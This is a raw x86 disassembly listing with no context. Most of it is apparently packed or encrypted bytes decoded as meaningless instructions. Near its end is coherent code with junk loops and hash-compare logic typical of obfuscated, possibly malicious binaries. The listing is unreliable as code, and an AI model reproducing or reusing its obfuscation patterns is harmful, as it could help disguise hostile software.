  413647:	rcr    ebp,0x1a
  41364a:	into   
  41364b:	ret    
  41364c:	hlt    
  41364d:	jg     0x4136c0
  41364f:	mov    bl,0x3e
  413651:	dec    eax
  413652:	pop    ecx
  413653:	scas   eax,DWORD PTR es:[edi]
  413654:	dec    esi
  413655:	fbld   TBYTE PTR [ebp+0x3f]
  413658:	out    dx,eax
  413659:	mov    BYTE PTR [ebx],cl
  41365b:	addr16 jmp 0x4136b7
  41365e:	mov    eax,ds:0xd3ff3917
  413663:	inc    esi
  413664:	sar    BYTE PTR [edx+0x70],0x16
  413668:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413669:	and    DWORD PTR [ebx+edx*4-0x4f],eax
  41366d:	lahf   
  41366e:	call   0xa127:0xe34b91e8
  413675:	stc    
  413676:	retf   0x6262
  413679:	xor    al,0x36
  41367b:	push   0xd46ba6da
  413680:	arpl   WORD PTR [ebx+ecx*1],sp
  413683:	push   edi
  413684:	xor    BYTE PTR [esi-0x36],dh
  413687:	xor    al,0x97
  413689:	lods   eax,DWORD PTR ds:[esi]
  41368a:	div    ch
  41368c:	(bad)  
  41368d:	rol    BYTE PTR [esi+0x40],1
  413690:	nop
  413691:	mov    ebp,0xd0f521f2
  413696:	add    DWORD PTR [edi+0x3d],ebx
  413699:	xor    DWORD PTR [edx-0x4f],eax
  41369c:	dec    edx
  41369d:	shl    DWORD PTR [esi-0x31f577ed],0x97
  4136a4:	jns    0x4136cb
  4136a6:	dec    eax
  4136a7:	sub    al,0x83
  4136a9:	mov    ebx,0x84a07343
  4136ae:	mov    BYTE PTR [esi],bh
  4136b0:	cmp    DWORD PTR [edx-0x17],edi
  4136b3:	loop   0x413661
  4136b5:	loopne 0x413646
  4136b7:	push   ebx
  4136b8:	mov    eax,ds:0xebf37b42
  4136bd:	rol    DWORD PTR [esi],cl
  4136bf:	jne    0x413682
  4136c1:	push   es
  4136c2:	dec    ebp
  4136c3:	out    0xdc,eax
  4136c5:	mov    WORD PTR [esi+0x67],ss
  4136c8:	sahf   
  4136c9:	test   DWORD PTR [eax+0x7],ecx
  4136cc:	imul   BYTE PTR [ebp-0x4637814c]
  4136d2:	jo     0x413747
  4136d4:	dec    esi
  4136d5:	pop    eax
  4136d6:	test   DWORD PTR [edx+0x4a],0x2ca6b4a1
  4136dd:	push   ds
  4136de:	mov    dl,0xf5
  4136e0:	push   edx
  4136e1:	sub    BYTE PTR [esi+0x5acca592],cl
  4136e7:	retf   
  4136e8:	xchg   BYTE PTR [eax],cl
  4136ea:	fsub   DWORD PTR [ecx-0x4b6e224f]
  4136f0:	mov    dh,0xaa
  4136f2:	sub    BYTE PTR [eax+esi*2-0x523de615],bl
  4136f9:	sbb    DWORD PTR [edx],esp
  4136fb:	rcl    DWORD PTR [ebx-0x7d],1
  4136fe:	and    DWORD PTR [eax],ebp
  413700:	arpl   WORD PTR [edi+0x30],sp
  413703:	ins    BYTE PTR es:[edi],dx
  413704:	jmp    0xb39da51b
  413709:	jl     0x413702
  41370b:	loope  0x413700
  41370d:	cdq    
  41370e:	nop
  41370f:	mov    al,0x36
  413711:	inc    esi
  413712:	mov    ah,0xe8
  413714:	mov    bh,0xcf
  413716:	clc    
  413717:	rol    BYTE PTR [ecx+0x65],1
  41371a:	push   edx
  41371b:	loopne 0x4136e4
  41371d:	sub    eax,0x90934f4a
  413722:	sub    ebp,DWORD PTR [eax]
  413724:	mov    ?,WORD PTR [esi]
  413726:	pop    es
  413727:	cmp    bh,BYTE PTR [ebp+ebp*2+0x18]
  41372b:	fs sub eax,0xc6f3930
  413731:	sub    eax,0xd3301a60
  413736:	jno    0x41378d
  413738:	(bad)  
  413739:	nop
  41373a:	call   DWORD PTR [ebp-0x38c11da7]
  413740:	mov    ds:0xfedea5b5,eax
  413745:	mov    esi,0xa63da6a1
  41374a:	scas   eax,DWORD PTR es:[edi]
  41374b:	retf   
  41374c:	mov    ah,0x88
  41374e:	push   edx
  41374f:	(bad)  
  413750:	fldenv fs:[esi-0x3e]
  413754:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413755:	mov    ah,0x85
  413757:	or     edi,DWORD PTR [ebp+0x28625d56]
  41375d:	mov    edx,0x5a665b32
  413762:	cmp    edi,eax
  413764:	jne    0x4141ef
  41376a:	push   DWORD PTR [ebp+0x8]
  41376d:	jmp    0x413a51
  413772:	and    al,0x98
  413774:	lods   al,BYTE PTR ds:[esi]
  413775:	shr    BYTE PTR [esp+edx*8-0x305f8b9c],0x9e
  41377d:	in     al,dx
  41377e:	sub    BYTE PTR [esi+0x6b35b402],bh
  413784:	jo     0x4137f6
  413786:	mov    ecx,0x6470707e
  41378b:	cld    
  41378c:	int    0x87
  41378e:	push   ebp
  41378f:	call   0x61be:0xc66e4f5d
  413796:	dec    eax
  413797:	hlt    
  413798:	cmp    dl,BYTE PTR [edx]
  41379a:	or     ebp,ebx
  41379c:	gs add edi,edi
  41379f:	lods   al,BYTE PTR ds:[esi]
  4137a0:	cld    
  4137a1:	pop    esp
  4137a2:	push   ebx
  4137a3:	push   ss
  4137a4:	ins    BYTE PTR es:[edi],dx
  4137a5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4137a6:	mov    eax,0xd8839d85
  4137ab:	pop    edi
  4137ac:	lahf   
  4137ad:	sub    eax,0x7781da0
  4137b2:	inc    ebx
  4137b3:	adc    DWORD PTR [ecx+0x15],ebx
  4137b6:	es in  al,dx
  4137b8:	stos   BYTE PTR es:[edi],al
  4137b9:	jmp    FWORD PTR [ebx+0x1672e49e]
  4137bf:	pop    edx
  4137c0:	fsubr  DWORD PTR [eax+ebx*2]
  4137c3:	popf   
  4137c4:	fisubr WORD PTR [ecx-0x7e811c]
  4137ca:	stos   DWORD PTR es:[edi],eax
  4137cb:	mov    eax,ds:0xb235bf92
  4137d0:	xchg   ax,ax
  4137d2:	jns    0x413789
  4137d4:	pusha  
  4137d5:	or     al,0x38
  4137d7:	or     edi,DWORD PTR [ecx+ebp*4]
  4137da:	sahf   
  4137db:	mov    al,ds:0x537aede9
  4137e0:	shr    BYTE PTR [edx-0x62],cl
  4137e3:	dec    edx
  4137e4:	xchg   esp,eax
  4137e5:	mov    fs,WORD PTR [ebx-0x4602c05b]
  4137eb:	popa   
  4137ec:	(bad)  
  4137ed:	jl     0x413837
  4137ef:	or     edi,DWORD PTR [eax-0x68]
  4137f2:	addr16 icebp 
  4137f4:	loopne 0x413792
  4137f6:	lods   al,BYTE PTR ds:[esi]
  4137f7:	fistp  QWORD PTR [eax+0x4dac777c]
  4137fd:	pop    esi
  4137fe:	inc    ecx
  4137ff:	popf   
  413800:	mov    bh,0x34
  413802:	fistp  QWORD PTR [ebx]
  413804:	imul   esp,DWORD PTR [esi+ebp*2],0xe17c0a84
  41380b:	mov    ebx,0x2b700c6
  413810:	shl    BYTE PTR [edx+0x44a67688],cl
  413816:	sbb    bh,BYTE PTR gs:[ecx]
  413819:	sub    eax,0xffffff98
  41381c:	retf   
  41381d:	scas   eax,DWORD PTR es:[edi]
  41381e:	dec    edi
  41381f:	ret    0x6cd5
  413822:	adc    ecx,DWORD PTR [ebp+eiz*8-0x2ac33c09]
  413829:	test   al,0xcf
  41382b:	or     edi,DWORD PTR [edx-0x36]
  41382e:	pop    ecx
  41382f:	inc    ebp
  413830:	(bad)  
  413831:	mov    DWORD PTR [ecx],esi
  413833:	mov    DWORD PTR [edi+0x1d7f311e],0x8900af4
  41383d:	pop    edx
  41383e:	sub    eax,0xa5480083
  413843:	pop    ecx
  413844:	mov    ds:0x1e55111b,al
  413849:	scas   al,BYTE PTR es:[edi]
  41384a:	lea    eax,[eax-0x7f41a1af]
  413850:	fwait
  413851:	js     0x413815
  413853:	push   cx
  413855:	test   ah,al
  413857:	inc    edi
  413858:	std    
  413859:	call   0xe8ef:0xa5b8283e
  413860:	or     DWORD PTR [esi],esp
  413862:	hlt    
  413863:	sbb    al,0xbc
  413865:	adc    BYTE PTR [eax-0x5d],ch
  413868:	icebp  
  413869:	or     eax,ecx
  41386b:	adc    al,0x59
  41386d:	out    dx,al
  41386e:	ins    DWORD PTR es:[edi],dx
  41386f:	xlat   BYTE PTR ds:[ebx]
  413870:	test   al,0x9c
  413872:	mov    eax,ds:0x81989637
  413877:	sub    BYTE PTR [ebx-0x71],dh
  41387a:	mov    esi,0x47b80558
  41387f:	mov    bl,0x13
  413881:	stos   BYTE PTR es:[edi],al
  413882:	daa    
  413883:	push   cs
  413884:	rol    cl,1
  413886:	leave  
  413887:	xchg   ecx,eax
  413888:	dec    esp
  413889:	push   ebx
  41388a:	inc    edi
  41388b:	and    DWORD PTR [ecx+0x37],edx
  41388e:	sbb    ch,BYTE PTR [edx]
  413890:	iret   
  413891:	retf   
  413892:	pop    eax
  413893:	call   0x760e45c4
  413898:	dec    edi
  413899:	cs mov ch,0xe0
  41389c:	jne    0x4138d8
  41389e:	push   esp
  41389f:	cld    
  4138a0:	aaa    
  4138a1:	xchg   ebp,eax
  4138a2:	fcmove st,st(5)
  4138a4:	jg     0x413923
  4138a6:	or     BYTE PTR [ebp-0x11cd7cbc],bl
  4138ac:	adc    cl,bl
  4138ae:	std    
  4138af:	dec    edi
  4138b0:	lea    ebx,[esp+edi*2-0x1f7a359c]
  4138b7:	jb     0x4138bc
  4138b9:	sub    dh,BYTE PTR [eax]
  4138bb:	push   eax
  4138bc:	and    DWORD PTR [edi+0x63],edi
  4138bf:	outs   dx,DWORD PTR ds:[esi]
  4138c0:	or     eax,0x10150650
  4138c5:	mov    ds:0xaa33b90b,al
  4138ca:	push   eax
  4138cb:	test   DWORD PTR [eax-0x780da7f5],eax
  4138d1:	dec    edx
  4138d2:	push   ecx
  4138d3:	cmp    esp,DWORD PTR [eax+0xc54bce1]
  4138d9:	push   cs
  4138da:	ret    0x9f81
  4138dd:	ja     0x413920
  4138df:	mov    edx,0x2395fb27
  4138e4:	fst    DWORD PTR [edx-0x69f6c087]
  4138ea:	sub    DWORD PTR [eax+0x16],edi
  4138ed:	outs   dx,DWORD PTR ds:[esi]
  4138ee:	and    ecx,edx
  4138f0:	sub    al,0xfe
  4138f2:	mov    bl,0xc9
  4138f4:	retf   
  4138f5:	sub    DWORD PTR [esi],edi
  4138f7:	clc    
  4138f8:	jne    0x4138b5
  4138fa:	stos   DWORD PTR es:[edi],eax
  4138fb:	mov    al,0x26
  4138fd:	dec    esp
  4138fe:	fmul   QWORD PTR [edi-0x19]
  413901:	mov    ch,0xa
  413903:	push   eax
  413904:	repnz cli 
  413906:	push   ss
  413907:	dec    esp
  413908:	fistp  WORD PTR [ebp+0x6a604a2e]
  41390e:	inc    ecx
  41390f:	iret   
  413910:	mov    dh,0x9b
  413912:	test   DWORD PTR [ebx],esi
  413914:	loop   0x413903
  413916:	outs   dx,DWORD PTR ds:[esi]
  413917:	fimul  DWORD PTR [esi]
  413919:	fbld   TBYTE PTR [edx]
  41391b:	inc    edi
  41391c:	in     eax,0xe5
  41391e:	mov    dh,0xfc
  413920:	aad    0x5b
  413922:	push   esi
  413923:	mov    ds:0x43caeda3,eax
  413928:	cld    
  413929:	cmc    
  41392a:	pop    ss
  41392b:	out    dx,eax
  41392c:	sub    eax,0x424b5f2f
  413931:	mov    ch,0x12
  413933:	lods   al,BYTE PTR ds:[esi]
  413934:	adc    al,0x2d
  413936:	ret    0x4558
  413939:	lock cmp edi,esp
  41393c:	dec    ecx
  41393d:	mov    edi,0xe615027a
  413942:	push   edx
  413943:	jns    0x413903
  413945:	mov    cl,BYTE PTR [eax+0x62]
  413948:	xchg   ecx,eax
  413949:	sub    ah,0x86
  41394c:	cwde   
  41394d:	clc    
  41394e:	push   ecx
  41394f:	sub    BYTE PTR es:[esi+0x35f6b7ae],dl
  413956:	jns    0x4138ee
  413958:	imul   BYTE PTR [edi]
  41395a:	jns    0x41397f
  41395c:	xchg   ebx,eax
  41395d:	mov    edx,0xecca9f27
  413962:	ins    BYTE PTR es:[edi],dx
  413963:	jmp    0x41394e
  413965:	sub    cl,BYTE PTR [esi-0x449f952b]
  41396b:	bnd jb 0x413979
  41396e:	add    eax,0x7a9d5b85
  413973:	fstp   TBYTE PTR [ebp+0x2385a501]
  413979:	inc    eax
  41397a:	aad    0xe5
  41397c:	mov    al,0xb3
  41397e:	cmp    al,0x71
  413980:	outs   dx,BYTE PTR ds:[esi]
  413981:	sub    DWORD PTR [ecx+0x17],0x10
  413985:	iret   
  413986:	adc    ah,ch
  413988:	push   ebp
  413989:	jns    0x4139be
  41398b:	ss retf 0xd260
  41398f:	loope  0x4139da
  413991:	psadbw mm0,QWORD PTR [esi-0x20]
  413995:	fdivr  DWORD PTR [ecx-0x4a]
  413998:	leave  
  413999:	mov    edi,0x89b743d2
  41399e:	mov    eax,ds:0x70eb6db
  4139a3:	dec    ecx
  4139a4:	mov    esi,0x8fefbd58
  4139a9:	dec    edx
  4139aa:	out    dx,eax
  4139ab:	dec    ebp
  4139ac:	int3   
  4139ad:	retf   
  4139ae:	leave  
  4139af:	in     al,0x3d
  4139b1:	xchg   edx,eax
  4139b2:	xchg   bl,bh
  4139b4:	pop    ss
  4139b5:	into   
  4139b6:	pop    ds
  4139b7:	jmp    0x4703:0x4a60ceca
  4139be:	dec    ecx
  4139bf:	mov    ah,0x6
  4139c1:	push   0x82e970b3
  4139c6:	test   DWORD PTR [eax+eiz*4+0x14],eax
  4139ca:	gs ja  0x413a1c
  4139cd:	sbb    eax,0x5f3e09cc
  4139d2:	gs std 
  4139d4:	mov    bh,0x61
  4139d6:	pop    edi
  4139d7:	pop    ss
  4139d8:	call   0x66bd:0xc112af8d
  4139df:	mov    dh,0x3a
  4139e1:	jnp    0x4139a2
  4139e3:	call   0xdbc1:0x6d0c289c
  4139ea:	push   0x44
  4139ec:	xchg   ecx,eax
  4139ed:	bound  ebp,QWORD PTR [edi+eax*4]
  4139f0:	mov    dh,dh
  4139f2:	iret   
  4139f3:	ins    BYTE PTR es:[edi],dx
  4139f4:	xor    eax,DWORD PTR [edx+0x71]
  4139f7:	imul   esp
  4139f9:	xchg   edx,eax
  4139fa:	lahf   
  4139fb:	dec    esp
  4139fc:	ret    
  4139fd:	xor    al,0xa3
  4139ff:	push   0x5c
  413a01:	out    0x50,al
  413a03:	out    dx,al
  413a04:	mov    WORD PTR [edi+ebx*1+0x23c6bbaf],es
  413a0b:	or     al,0x19
  413a0d:	loope  0x4139ce
  413a0f:	iret   
  413a10:	into   
  413a11:	xlat   BYTE PTR ds:[ebx]
  413a12:	aaa    
  413a13:	int    0x5b
  413a15:	lahf   
  413a16:	fmul   QWORD PTR [edx-0x942ac2c]
  413a1c:	loope  0x413a69
  413a1e:	cmp    eax,0x8d5fb579
  413a23:	and    dh,BYTE PTR [ebx-0x5]
  413a26:	cmc    
  413a27:	fdiv   DWORD PTR [edi-0x5101d5cd]
  413a2d:	sub    ecx,DWORD PTR [ebx+0x2653bd0f]
  413a33:	cli    
  413a34:	dec    eax
  413a35:	icebp  
  413a36:	add    edi,ebx
  413a38:	sbb    al,cl
  413a3a:	sub    al,0x30
  413a3c:	mov    ah,0x57
  413a3e:	fnstsw WORD PTR ds:0x4c88a990
  413a44:	jne    0x4139f9
  413a46:	mov    esi,0x14326bd4
  413a4b:	lea    ecx,[edi-0x17]
  413a4e:	ror    DWORD PTR [eax-0x4288174a],cl
  413a54:	(bad)  
  413a55:	(bad)  
  413a56:	jmp    0x413d3a
  413a5b:	pop    ebx
  413a5c:	ins    DWORD PTR es:[edi],dx
  413a5d:	and    al,0xa9
  413a5f:	xor    dh,BYTE PTR [ecx+0x71]
  413a62:	ins    DWORD PTR es:[edi],dx
  413a63:	jp     0x413a20
  413a65:	or     esi,ecx
  413a67:	push   0x7e0d6339
  413a6c:	push   0x7eb97070
  413a71:	jo     0x413ae3
  413a73:	mov    ah,0x90
  413a75:	push   esp
  413a76:	(bad)  
  413a77:	jp     0x413aca
  413a79:	xchg   esi,eax
  413a7a:	ins    DWORD PTR es:[edi],dx
  413a7b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413a7c:	mov    eax,0x3ca4cd8f
  413a81:	inc    ebp
  413a82:	push   esp
  413a83:	ss out 0xdf,al
  413a86:	jo     0x413a7c
  413a88:	loop   0x413a49
  413a8a:	mov    edi,0x6fe6436
  413a8f:	imul   esi,DWORD PTR [eax],0xcd210c3a
  413a95:	fs mov edi,0x337b818e
  413a9b:	pcmpeqw mm6,mm2
  413a9e:	xchg   DWORD PTR [ebx-0x7b1169bf],ebx
  413aa4:	popa   
  413aa5:	arpl   WORD PTR [eax-0x26],di
  413aa8:	mov    ecx,0xd6a3b178
  413aad:	ja     0x413aaf
  413aaf:	mov    eax,0xd8c2fd55
  413ab4:	push   0xffffffcd
  413ab6:	xchg   ebx,eax
  413ab7:	test   al,0xba
  413ab9:	fdivr  DWORD PTR [ecx]
  413abb:	(bad)  
  413abc:	bound  eax,QWORD PTR [edx+esi*2]
  413abf:	mov    edx,0xe76ff3d4
  413ac4:	outs   dx,DWORD PTR ds:[esi]
  413ac5:	or     DWORD PTR [edi-0x5186b556],ebp
  413acb:	dec    BYTE PTR [ecx-0x20c826c2]
  413ad1:	loopne 0x413aee
  413ad3:	jle    0x413b1c
  413ad5:	ss xchg edi,eax
  413ad7:	(bad)  
  413ad8:	jo     0x413b1f
  413ada:	aad    0xb3
  413adc:	mov    dh,BYTE PTR [edx+0x1f8654db]
  413ae2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413ae3:	rol    BYTE PTR [ebx],0x97
  413ae6:	jmp    DWORD PTR [ecx]
  413ae8:	ror    DWORD PTR [ecx-0x15340d89],cl
  413aee:	lock sti 
  413af0:	and    DWORD PTR [edx+0x3],eax
  413af3:	hlt    
  413af4:	call   0xeeaebfbb
  413af9:	mov    eax,ds:0x6450c7
  413afe:	out    dx,eax
  413aff:	ss rcl bh,cl
  413b02:	jb     0x413aa9
  413b04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b05:	and    al,0x78
  413b07:	ja     0x413b3c
  413b09:	jp     0x413af0
  413b0b:	mov    ebp,0xb2cfd37c
  413b10:	jp     0x413b89
  413b12:	fist   WORD PTR [edi-0x136ad940]
  413b18:	push   ss
  413b19:	loope  0x413b7d
  413b1b:	xor    esp,DWORD PTR [eax-0x2e97cd00]
  413b21:	inc    edi
  413b22:	pop    ss
  413b23:	nop
  413b24:	mov    al,ds:0x8c4947f9
  413b29:	test   BYTE PTR [edi+0x9529f04],bh
  413b2f:	dec    edi
  413b30:	dec    edi
  413b31:	cmp    esp,edi
  413b33:	test   DWORD PTR [edi+0x32534358],ebp
  413b39:	cld    
  413b3a:	inc    ebx
  413b3b:	repz jne 0x413b7a
  413b3e:	test   DWORD PTR [esi-0x3a],ebx
  413b41:	div    BYTE PTR [eax+edi*2]
  413b44:	xchg   esp,eax
  413b45:	in     eax,dx
  413b46:	push   es
  413b47:	lahf   
  413b48:	inc    ebx
  413b49:	xchg   esi,eax
  413b4a:	push   esi
  413b4b:	push   esp
  413b4c:	mov    esi,0xd03d015f
  413b51:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413b52:	out    0x7a,eax
  413b54:	call   0xf6a4f598
  413b59:	mov    BYTE PTR [edi+ebp*8],al
  413b5c:	push   ss
  413b5d:	jge    0x413b84
  413b5f:	xchg   esi,eax
  413b60:	xchg   ebp,eax
  413b61:	cmp    cl,ch
  413b63:	sbb    eax,0x428116c7
  413b68:	cdq    
  413b69:	jl     0x413b49
  413b6b:	retf   0x37cb
  413b6e:	inc    ebp
  413b6f:	jp     0x413bc9
  413b71:	sti    
  413b72:	adc    edx,DWORD PTR [edx+eiz*4+0x21c0019f]
  413b79:	cmc    
  413b7a:	es lock int3 
  413b7d:	mov    eax,ds:0x19349e29
  413b82:	pop    eax
  413b83:	mov    esi,0x73ef1eaf
  413b88:	call   0x2bbacd33
  413b8d:	jne    0x413b8d
  413b8f:	xlat   BYTE PTR ds:[ebx]
  413b90:	sub    eax,0x45a25fc0
  413b95:	pop    es
  413b96:	sbb    dl,al
  413b98:	js     0x413c0f
  413b9a:	xor    al,0xec
  413b9c:	mov    cl,BYTE PTR [ebx+0x3a36850c]
  413ba2:	(bad)  
  413ba3:	jne    0x413b2c
  413ba5:	xchg   ebx,eax
  413ba6:	push   edx
  413ba7:	repz mov bl,0xf9
  413baa:	add    bl,bl
  413bac:	fimul  DWORD PTR [edi-0x36]
  413baf:	and    dl,BYTE PTR [edx+0x9]
  413bb2:	sbb    al,0xbc
  413bb4:	push   ss
  413bb5:	and    al,BYTE PTR [ebp+0x496b4958]
  413bbb:	dec    esp
  413bbc:	cld    
  413bbd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413bbe:	repnz add eax,0x1e005e28
  413bc4:	xor    eax,0xee94b3e5
  413bc9:	fidivr DWORD PTR [eax]
  413bcb:	fcom   DWORD PTR [edi+0x5282aef3]
  413bd1:	lahf   
  413bd2:	fisub  WORD PTR [esi+ecx*8]
  413bd5:	or     dl,BYTE PTR [ebx-0x25]
  413bd8:	xbegin 0x7f6eef69
  413bde:	jbe    0x413be2
  413be0:	push   ss
  413be1:	in     al,0xa9
  413be3:	clc    
  413be4:	sbb    BYTE PTR [ecx-0x4a6f82f7],cl
  413bea:	and    eax,DWORD PTR [ebp-0x7259b0df]
  413bf0:	cdq    
  413bf1:	jg     0x413ba5
  413bf3:	pop    eax
  413bf4:	adc    al,0x12
  413bf6:	and    al,0x30
  413bf8:	dec    edi
  413bf9:	mov    edi,0x12842f8
  413bfe:	cmp    al,0x4
  413c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413c01:	nop
  413c02:	xor    ebx,DWORD PTR [esi+0x4a]
  413c05:	inc    ebp
  413c06:	pop    edx
  413c07:	adc    DWORD PTR [edx+ebx*4],0xe99a11ca
  413c0e:	mov    esp,0x5debaa27
  413c13:	jmp    0xc259:0x3eff36ac
  413c1a:	out    0x8e,eax
  413c1c:	mov    ch,0xd1
  413c1e:	inc    ecx
  413c1f:	leave  
  413c20:	push   es
  413c21:	xor    ebp,DWORD PTR [eax-0x13]
  413c24:	xlat   BYTE PTR ds:[ebx]
  413c25:	mov    bl,0xd2
  413c27:	push   ebp
  413c28:	inc    esi
  413c29:	xor    cl,ch
  413c2b:	jmp    0xd0e8:0x3dd0071b
  413c32:	adc    eax,DWORD PTR [eax+0x75]
  413c35:	jmp    0x1faa:0x2c105ddb
  413c3c:	add    DWORD PTR [edi],edx
  413c3e:	xchg   edx,eax
  413c3f:	xchg   ebp,eax
  413c40:	mov    edx,0xa5b99be6
  413c45:	popa   
  413c46:	and    bh,BYTE PTR [ebp+0x1c]
  413c49:	retf   0xe912
  413c4c:	and    eax,0x3bde1a2
  413c51:	or     eax,0x8a808a9e
  413c56:	fmul   QWORD PTR ds:0x109ef239
  413c5c:	outs   dx,BYTE PTR ds:[esi]
  413c5d:	imul   esp,DWORD PTR [esi+0x4bd3f5e0],0xf70a125a
  413c67:	out    0x5a,eax
  413c69:	cwde   
  413c6a:	xor    al,0xf9
  413c6c:	out    0x5,al
  413c6e:	sahf   
  413c6f:	sbb    ch,BYTE PTR [ebx-0x53bfa710]
  413c75:	(bad)  
  413c76:	sti    
  413c77:	jle    0x413c0e
  413c79:	ret    0xc51e
  413c7c:	outs   dx,BYTE PTR ds:[esi]
  413c7d:	out    dx,eax
  413c7e:	pop    ebx
  413c7f:	aad    0xad
  413c81:	adc    bh,BYTE PTR [eax]
  413c83:	bound  eax,QWORD PTR [ebx]
  413c85:	pushf  
  413c86:	xlat   BYTE PTR ds:[ebx]
  413c87:	mov    ecx,0x36095b07
  413c8c:	js     0x413cf5
  413c8e:	xor    al,0x42
  413c90:	inc    ebp
  413c91:	push   0x70181a50
  413c96:	dec    edx
  413c97:	or     eax,0xb1ddda93
  413c9c:	rcl    BYTE PTR [esi+ebp*4],1
  413c9f:	rcr    DWORD PTR [edx-0x45],1
  413ca2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ca3:	pop    ss
  413ca4:	xchg   edx,eax
  413ca5:	cwde   
  413ca6:	lock inc eax
  413ca8:	loope  0x413c66
  413caa:	and    ah,BYTE PTR [ecx-0x520ad003]
  413cb0:	or     BYTE PTR [eax-0x232883d2],dl
  413cb6:	mov    ds:0x63caf6e1,eax
  413cbb:	sub    dl,bl
  413cbd:	call   0x42869731
  413cc2:	jae    0x413cb1
  413cc4:	adc    eax,0x21f6b4f
  413cc9:	add    BYTE PTR ds:0x14d9bc72,0x72
  413cd0:	and    dh,BYTE PTR [esi+0x4cc755c8]
  413cd6:	mov    ds:0x4a8ead40,al
  413cdb:	push   0x5a5ae766
  413ce0:	sub    ebx,eax
  413ce2:	mul    BYTE PTR [ebx-0xf]
  413ce5:	sub    DWORD PTR [ebx+ebp*2],ecx
  413ce8:	in     eax,dx
  413ce9:	dec    eax
  413cea:	dec    ebx
  413ceb:	arpl   WORD PTR [esi+eax*8+0x35],si
  413cef:	mov    edx,0x60835128
  413cf4:	cmp    ch,BYTE PTR [eax-0x72b12782]
  413cfa:	retf   0x31ae
  413cfd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413cfe:	dec    ecx
  413cff:	call   0xd5da:0x10dbeeaf
  413d06:	xor    bl,BYTE PTR [esi-0x5a4444aa]
  413d0c:	call   0x455d1444
  413d11:	cs inc ebx
  413d13:	push   eax
  413d14:	(bad)  
  413d15:	fild   QWORD PTR [ebp+0x51]
  413d18:	cmp    al,bl
  413d1a:	int3   
  413d1b:	or     eax,0x20c4ca1c
  413d20:	adc    BYTE PTR [ecx],0x4e
  413d23:	adc    DWORD PTR ds:0x272722f,eax
  413d29:	outs   dx,DWORD PTR ds:[esi]
  413d2a:	cmp    bl,bl
  413d2c:	pusha  
  413d2d:	lock call 0x9eedb4dd
  413d33:	sbb    al,0x61
  413d35:	jae    0x413d31
  413d37:	cwde   
  413d38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413d39:	in     al,dx
  413d3a:	mov    DWORD PTR [ebp-0x20],eax
  413d3d:	mov    eax,DWORD PTR [ebp-0x4]
  413d40:	sub    ecx,ecx
  413d42:	mov    ecx,DWORD PTR [ebp-0x20]
  413d45:	mov    DWORD PTR ds:0x42e77f,0x1b
  413d4f:	cmp    DWORD PTR ds:0x42e77f,0x0
  413d56:	je     0x413dab
  413d5c:	cmp    DWORD PTR ds:0x42e77f,0x2
  413d63:	jne    0x413d7f
  413d69:	push   DWORD PTR [ebp-0xc]
  413d6c:	push   0x52a1
  413d71:	push   0x824e
  413d76:	push   DWORD PTR [ebp-0x18]
  413d79:	call   DWORD PTR ds:0x42e5eb
  413d7f:	cmp    DWORD PTR ds:0x42e77f,0x3
  413d86:	jne    0x413d99
  413d8c:	mov    esi,DWORD PTR ds:0x42e77f
  413d92:	dec    esi
  413d93:	mov    DWORD PTR ds:0x42e77f,esi
  413d99:	mov    esi,DWORD PTR ds:0x42e77f
  413d9f:	dec    esi
  413da0:	mov    DWORD PTR ds:0x42e77f,esi
  413da6:	jmp    0x413d4f
  413dab:	mov    esi,0x7510855
  413db0:	or     DWORD PTR ds:0x42e78f,0x42fe06
  413dba:	xor    eax,esi
  413dbc:	add    eax,ebx
  413dbe:	cmp    ecx,eax
  413dc0:	mov    DWORD PTR ds:0x42e1ac,0x588b
  413dca:	je     0x414b4e
  413dd0:	push   DWORD PTR [ebp-0x20]
  413dd3:	dec    DWORD PTR ds:0x42e777
  413dd9:	push   DWORD PTR [ebp+0x8]
  413ddc:	xor    DWORD PTR ds:0x42fd59,0x42e1a0
  413de6:	call   0x405485
  413deb:	mov    DWORD PTR [ebp-0x14],eax
  413dee:	and    DWORD PTR ds:0x42e77b,0x0
  413df8:	jmp    0x413e08
  413dfd:	mov    eax,ds:0x42e77b
  413e02:	inc    eax
  413e03:	mov    ds:0x42e77b,eax
  413e08:	cmp    DWORD PTR ds:0x42e77b,0x10
  413e0f:	jae    0x413e33
  413e15:	cmp    DWORD PTR ds:0x42e77b,0x16
  413e1c:	jne    0x413e28
  413e22:	call   DWORD PTR ds:0x42e50b
  413e28:	jmp    0x413dfd
  413e2d:	sub    DWORD PTR ds:0x42fd81,ecx
  413e33:	mov    eax,DWORD PTR [ebp-0x4]
  413e36:	or     DWORD PTR ds:0x42e777,edx
  413e3c:	mov    ecx,DWORD PTR [ebp-0x14]
  413e3f:	adc    DWORD PTR ds:0x42fe0a,0x2715
  413e49:	xor    eax,esi
  413e4b:	dec    DWORD PTR ds:0x42e783
  413e51:	add    eax,ebx
  413e53:	mov    DWORD PTR ds:0x42e19c,0x499a
  413e5d:	cmp    ecx,eax
  413e5f:	je     0x414b4e
  413e65:	not    eax
  413e67:	mov    eax,DWORD PTR [ebp-0x14]
  413e6a:	mov    eax,DWORD PTR [eax+0x18]
  413e6d:	mov    DWORD PTR [ebp-0x20],eax
  413e70:	xor    DWORD PTR ds:0x42e77b,0x4f5
  413e7a:	jmp    0x41415e
  413e7f:	lods   al,BYTE PTR ds:[esi]
  413e80:	mov    WORD PTR [edx],gs
  413e82:	loopne 0x413eae
  413e84:	outs   dx,BYTE PTR ds:[esi]
  413e85:	push   0x4c
  413e87:	repz push edi
  413e89:	scas   eax,DWORD PTR es:[edi]
  413e8a:	(bad)  
  413e8b:	sbb    DWORD PTR [ecx-0x22],eax
  413e8e:	and    eax,0x70707647
  413e93:	mov    ecx,0x4270707e
  413e98:	je     0x413e56
  413e9a:	int3   
  413e9b:	std    
  413e9c:	adc    eax,ecx
  413e9e:	or     al,0x77
  413ea0:	pop    ds
  413ea1:	mov    esp,0xed57468a
